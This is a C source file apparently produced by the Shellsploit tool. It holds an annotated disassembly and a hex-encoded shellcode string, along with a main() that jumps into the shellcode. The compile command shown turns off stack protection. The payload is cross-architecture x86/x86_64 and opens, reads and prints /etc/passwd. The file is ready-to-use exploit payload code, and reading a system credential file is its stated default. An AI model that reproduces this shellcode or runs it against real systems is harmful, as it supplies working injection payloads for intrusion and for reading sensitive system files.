/*
[+] Author  : B3mB4m
[~] Contact : b3mb4m@protonmail.com
[~] Project : https://github.com/b3mb4m/Shellsploit
[~] Greetz  : Bomberman,T-Rex,KnocKout,ZoRLu



#If you want test it, you must compile it within x86 OS.
#Or basically you can get it with shellsploit.
#Default setthings for /etc/passwd


00000000  31C0              xor eax,eax
00000002  40                inc eax
00000003  743A              jz 0x3f
00000005  31C9              xor ecx,ecx
00000007  31C0              xor eax,eax
00000009  31D2              xor edx,edx
0000000B  51                push ecx
0000000C  B005              mov al,0x5
0000000E  6873737764        push dword 0x64777373
00000013  68632F7061        push dword 0x61702f63
00000018  682F2F6574        push dword 0x74652f2f
0000001D  89E3              mov ebx,esp
0000001F  CD80              int 0x80
00000021  89D9              mov ecx,ebx
00000023  89C3              mov ebx,eax
00000025  B003              mov al,0x3
00000027  66BAFF0F          mov dx,0xfff
0000002B  6642              inc dx
0000002D  CD80              int 0x80
0000002F  31C0              xor eax,eax
00000031  31DB              xor ebx,ebx
00000033  B301              mov bl,0x1
00000035  B004              mov al,0x4
00000037  CD80              int 0x80
00000039  31C0              xor eax,eax
0000003B  B001              mov al,0x1
0000003D  CD80              int 0x80
0000003F  EB3F              jmp short 0x80
00000041  5F                pop edi
00000042  80770B41          xor byte [edi+0xb],0x41
00000046  48                dec eax
00000047  31C0              xor eax,eax
00000049  0402              add al,0x2
0000004B  48                dec eax
0000004C  31F6              xor esi,esi
0000004E  0F05              syscall
00000050  6681ECFF0F        sub sp,0xfff
00000055  48                dec eax
00000056  8D3424            lea esi,[esp]
00000059  48                dec eax
0000005A  89C7              mov edi,eax
0000005C  48                dec eax
0000005D  31D2              xor edx,edx
0000005F  66BAFF0F          mov dx,0xfff
00000063  48                dec eax
00000064  31C0              xor eax,eax
00000066  0F05              syscall
00000068  48                dec eax
00000069  31FF              xor edi,edi
0000006B  40                inc eax
0000006C  80C701            add bh,0x1
0000006F  48                dec eax
00000070  89C2              mov edx,eax
00000072  48                dec eax
00000073  31C0              xor eax,eax
00000075  0401              add al,0x1
00000077  0F05              syscall
00000079  48                dec eax
0000007A  31C0              xor eax,eax
0000007C  043C              add al,0x3c
0000007E  0F05              syscall
00000080  E8BCFFFFFF        call dword 0x41
00000085  2F                das
00000086  657463            gs jz 0xec
00000089  2F                das
0000008A  7061              jo 0xed
0000008C  7373              jnc 0x101
0000008E  7764              ja 0xf4
00000090  41                inc ecx
00000091  2F                das
00000092  657463            gs jz 0xf8
00000095  2F                das
00000096  7061              jo 0xf9
00000098  7373              jnc 0x10d
0000009A  7764              ja 0x100
*/


//Project : https://github.com/b3mb4m/Shellsploit
//This file created with shellsploit ..
//19/01/2016 - 00:29:31
//Compile : gcc -fno-stack-protector -z execstack shell.c -o shell

unsigned char shellcode[] =
"\x31\xc0\x40\x74\x3a\x31\xc9\x31\xc0\x31\xd2\x51\xb0\x05\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x89\xd9\x89\xc3\xb0\x03\x66\xba\xff\x0f\x66\x42\xcd\x80\x31\xc0\x31\xdb\xb3\x01\xb0\x04\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64";

int main(void){
    (*(void(*)()) shellcode)();
}